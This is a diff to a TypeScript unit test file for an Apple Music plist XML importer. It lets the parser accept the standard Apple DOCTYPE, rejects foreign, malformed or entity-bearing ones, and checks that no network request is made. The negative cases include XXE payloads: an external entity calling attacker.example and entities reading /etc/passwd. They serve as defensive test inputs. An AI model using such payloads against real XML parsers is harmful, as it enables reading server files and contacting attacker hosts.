@@ -1,9 +1,10 @@
-import { describe, expect, it } from 'vitest';
+import { describe, expect, it, vi } from 'vitest';
 import {
   parseApplePlistXmlFromBytes,
   parseApplePlistXmlFromText,
 } from '../src/apple-xml.js';
 import {
+  PLIST_STANDARD_DOCTYPE,
   encodeUtf16Le,
   expectErrorCode,
   plistLibraryXml,
@@ -135,16 +136,23 @@ describe('Apple Music plist XML 解析', () => {
     expect(playlist.warnings.some((w) => w.includes('2 处不支持的 data'))).toBe(true);
   });
 
-  it('DOCTYPE 声明被拒绝（防外部实体注入）', () => {
-    const error = expectErrorCode(
-      () => parseApplePlistXmlFromText(plistLibraryXml({
-        tracks: [],
-        playlists: [{ name: '合成歌单', items: [] }],
-        includeDoctype: true,
-      })),
-      'IMPORT_XML_DOCTYPE_FORBIDDEN',
-    );
-    expect(error.technicalDetails).toMatchObject({ line: 1 });
+  it('标准 plist DOCTYPE 声明被跳过，文件正常导入', () => {
+    const playlist = parseApplePlistXmlFromText(plistLibraryXml({
+      tracks: LIBRARY_TRACKS,
+      playlists: [{ name: '合成歌单', playlistId: 9001, items: [101, 102, 103] }],
+      includeDoctype: true,
+    }));
+
+    expect(playlist.source).toBe('apple-music');
+    expect(playlist.complete).toBe(true);
+    expect(playlist.total).toBe(3);
+    expect(playlist.name).toBe('合成歌单');
+    expect(playlist.warnings).toEqual([]);
+    expect(playlist.tracks.map((track) => [track.title, track.trackId])).toEqual([
+      ['测试曲目一', '101'],
+      ['测试曲目二', '102'],
+      ['测试曲目三', '103'],
+    ]);
   });
 
   it('根节点不是 dict（array 根）时报 IMPORT_XML_ROOT', () => {
@@ -312,5 +320,230 @@ describe('重复引用', () => {
 
     expect(playlist.tracks.map((track) => track.title)).toEqual(['测试曲目一', '测试曲目一']);
     expect(playlist.tracks.map((track) => track.position)).toEqual([0, 1]);
+  });
+});
+
+describe('DOCTYPE 声明接受面', () => {
+  const baseSpec = {
+    tracks: LIBRARY_TRACKS,
+    playlists: [{ name: '合成歌单', playlistId: 9001, items: [101, 999, 102, 101] }],
+  } as const;
+
+  it('含标准 DOCTYPE 声明导入的结果与无声明完全一致（顺序、重复曲目、缺失引用占位不变）', () => {
+    const withDoctype = parseApplePlistXmlFromText(
+      plistLibraryXml({ ...baseSpec, includeDoctype: true }),
+    );
+    const withoutDoctype = parseApplePlistXmlFromText(plistLibraryXml(baseSpec));
+
+    expect(withDoctype).toEqual(withoutDoctype);
+    expect(withDoctype.tracks.map((track) => [track.title, track.position])).toEqual([
+      ['测试曲目一', 0],
+      ['[unknown title]', 1],
+      ['测试曲目二', 2],
+      ['测试曲目一', 3],
+    ]);
+    expect(withDoctype.tracks[1]).toMatchObject({
+      availability: 'removed',
+      artists: ['[unknown artist]'],
+    });
+    expect(withDoctype.tracks[3].trackId).toBe('101');
+    expect(withDoctype.warnings.some((w) => w.includes('1 项曲目引用缺失'))).toBe(true);
+  });
+
+  it('无 DOCTYPE 声明的文件仍可正常导入', () => {
+    const playlist = parseApplePlistXmlFromText(plistLibraryXml({
+      tracks: [{ id: 131, name: '测试曲目一', artist: '歌手甲' }],
+      playlists: [{ name: '合成歌单', items: [131] }],
+    }));
+
+    expect(playlist.complete).toBe(true);
+    expect(playlist.tracks[0]).toMatchObject({ title: '测试曲目一', trackId: '131' });
+  });
+
+  it('标准 DOCTYPE 声明内的空白变化被容忍（引号内值仍需精确匹配）', () => {
+    const playlist = parseApplePlistXmlFromText(plistLibraryXml({
+      tracks: [{ id: 132, name: '测试曲目一', artist: '歌手甲' }],
+      playlists: [{ name: '合成歌单', items: [132] }],
+      doctypeRaw:
+        '<!DOCTYPE\nplist\n  PUBLIC\n\t"-//Apple//DTD PLIST 1.0//EN"\n' +
+        '\t"http://www.apple.com/DTDs/PropertyList-1.0.dtd">',
+    }));
+
+    expect(playlist.tracks[0]).toMatchObject({ title: '测试曲目一', trackId: '132' });
+  });
+
+  it('DOCTYPE 含内部子集（自定义实体定义）时被拒绝', () => {
+    const withSubset = (subset: string): string =>
+      plistLibraryXml({
+        tracks: [{ id: 141, name: '测试曲目一', artist: '歌手甲' }],
+        playlists: [{ name: '合成歌单', items: [141] }],
+        doctypeRaw:
+          '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" ' +
+          `"http://www.apple.com/DTDs/PropertyList-1.0.dtd" [${subset}]>`,
+      });
+
+    expectErrorCode(
+      () => parseApplePlistXmlFromText(withSubset('<!ENTITY xxe "evil">')),
+      'IMPORT_XML_DOCTYPE_FORBIDDEN',
+    );
+    expectErrorCode(
+      () =>
+        parseApplePlistXmlFromText(
+          withSubset('<!ENTITY % remote SYSTEM "http://attacker.example/evil.dtd">'),
+        ),
+      'IMPORT_XML_DOCTYPE_FORBIDDEN',
+    );
+    expectErrorCode(
+      () => parseApplePlistXmlFromText(withSubset('<!ENTITY xxe SYSTEM "file:///etc/passwd">')),
+      'IMPORT_XML_DOCTYPE_FORBIDDEN',
+    );
+    // 空内部子集同样不允许。
+    expectErrorCode(
+      () => parseApplePlistXmlFromText(withSubset('')),
+      'IMPORT_XML_DOCTYPE_FORBIDDEN',
+    );
+  });
+
+  it('未知外部声明的 DOCTYPE 被拒绝（非官方 FPI / 非官方 URL / file:// / SYSTEM 形式）', () => {
+    const foreignDoctypes = [
+      '<!DOCTYPE plist PUBLIC "-//Malware//DTD EVIL 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">',
+      '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://attacker.example/PropertyList-1.0.dtd">',
+      '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "file:///etc/passwd">',
+      '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">',
+      '<!DOCTYPE plist SYSTEM "http://www.apple.com/DTDs/PropertyList-1.0.dtd">',
+    ];
+
+    for (const doctype of foreignDoctypes) {
+      expectErrorCode(
+        () => parseApplePlistXmlFromText(plistLibraryXml({
+          tracks: [{ id: 142, name: '测试曲目一', artist: '歌手甲' }],
+          playlists: [{ name: '合成歌单', items: [142] }],
+          doctypeRaw: doctype,
+        })),
+        'IMPORT_XML_DOCTYPE_FORBIDDEN',
+      );
+    }
+  });
+
+  it('非 plist 根元素名称的 DOCTYPE 被拒绝', () => {
+    const withRootName = (rootName: string): string =>
+      plistLibraryXml({
+        tracks: [{ id: 143, name: '测试曲目一', artist: '歌手甲' }],
+        playlists: [{ name: '合成歌单', items: [143] }],
+        doctypeRaw:
+          `<!DOCTYPE ${rootName} PUBLIC "-//Apple//DTD PLIST 1.0//EN" ` +
+          '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">',
+      });
+
+    expectErrorCode(
+      () => parseApplePlistXmlFromText(withRootName('foo')),
+      'IMPORT_XML_DOCTYPE_FORBIDDEN',
+    );
+    // DOCTYPE 名称区分大小写，PLIST 不等于 plist。
+    expectErrorCode(
+      () => parseApplePlistXmlFromText(withRootName('PLIST')),
+      'IMPORT_XML_DOCTYPE_FORBIDDEN',
+    );
+  });
+
+  it('畸形 DOCTYPE 声明被拒绝', () => {
+    const malformedDoctypes = [
+      '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN',
+      '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"',
+      '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd" junk>',
+      '<!DOCTYPEplist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">',
+      '<!doctype plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">',
+      '<!DOCTYPE>',
+      '<!DOCTYPE plist>',
+      '<!DOCTYPE plist PUBLIC -//Apple//DTD PLIST 1.0//EN>',
+    ];
+
+    let firstError: ReturnType<typeof expectErrorCode> | undefined;
+    for (const doctype of malformedDoctypes) {
+      const error = expectErrorCode(
+        () => parseApplePlistXmlFromText(plistLibraryXml({
+          tracks: [],
+          playlists: [{ name: '合成歌单', items: [] }],
+          doctypeRaw: doctype,
+        })),
+        'IMPORT_XML_DOCTYPE_FORBIDDEN',
+      );
+      firstError ??= error;
+    }
+    // 每次拒绝都带结构化行列信息（具体行列因声明截断位置而异）。
+    expect(firstError?.technicalDetails).toMatchObject({
+      line: expect.any(Number),
+      column: expect.any(Number),
+    });
+  });
+
+  it('DOCTYPE 出现在文档中段或根元素之后时被拒绝', () => {
+    const base = plistLibraryXml({
+      tracks: [{ id: 151, name: '测试曲目一', artist: '歌手甲' }],
+      playlists: [{ name: '合成歌单', items: [151] }],
+    });
+
+    // 文档中段（根元素内部）。
+    expectErrorCode(
+      () =>
+        parseApplePlistXmlFromText(
+          base.replace('<key>Playlists</key>', `${PLIST_STANDARD_DOCTYPE}<key>Playlists</key>`),
+        ),
+      'IMPORT_XML_DOCTYPE_FORBIDDEN',
+    );
+    // 根元素闭合之后。
+    expectErrorCode(
+      () => parseApplePlistXmlFromText(`${base}\n${PLIST_STANDARD_DOCTYPE}`),
+      'IMPORT_XML_DOCTYPE_FORBIDDEN',
+    );
+  });
+
+  it('重复的 DOCTYPE 声明被拒绝', () => {
+    expectErrorCode(
+      () => parseApplePlistXmlFromText(plistLibraryXml({
+        tracks: [{ id: 161, name: '测试曲目一', artist: '歌手甲' }],
+        playlists: [{ name: '合成歌单', items: [161] }],
+        doctypeRaw: `${PLIST_STANDARD_DOCTYPE}\n${PLIST_STANDARD_DOCTYPE}`,
+      })),
+      'IMPORT_XML_DOCTYPE_FORBIDDEN',
+    );
+  });
+
+  it('DOCTYPE 处理全程不发起网络请求（注入 fetch 监视）', () => {
+    const fetchSpy = vi.fn(async () => {
+      throw new Error('测试环境禁止网络访问');
+    });
+    vi.stubGlobal('fetch', fetchSpy);
+    try {
+      const accepted = parseApplePlistXmlFromText(plistLibraryXml({
+        tracks: [{ id: 171, name: '测试曲目一', artist: '歌手甲' }],
+        playlists: [{ name: '合成歌单', items: [171] }],
+        includeDoctype: true,
+      }));
+      expect(accepted.tracks.map((track) => track.title)).toEqual(['测试曲目一']);
+
+      const rejectedDoctypes = [
+        PLIST_STANDARD_DOCTYPE.replace(
+          '"http://www.apple.com/DTDs/PropertyList-1.0.dtd"',
+          '"file:///etc/passwd"',
+        ),
+        '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
+          + '"http://www.apple.com/DTDs/PropertyList-1.0.dtd" [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
+      ];
+      for (const doctype of rejectedDoctypes) {
+        expectErrorCode(
+          () => parseApplePlistXmlFromText(plistLibraryXml({
+            tracks: [],
+            playlists: [{ name: '合成歌单', items: [] }],
+            doctypeRaw: doctype,
+          })),
+          'IMPORT_XML_DOCTYPE_FORBIDDEN',
+        );
+      }
+
+      expect(fetchSpy).not.toHaveBeenCalled();
+    } finally {
+      vi.unstubAllGlobals();
+    }
   });
 });
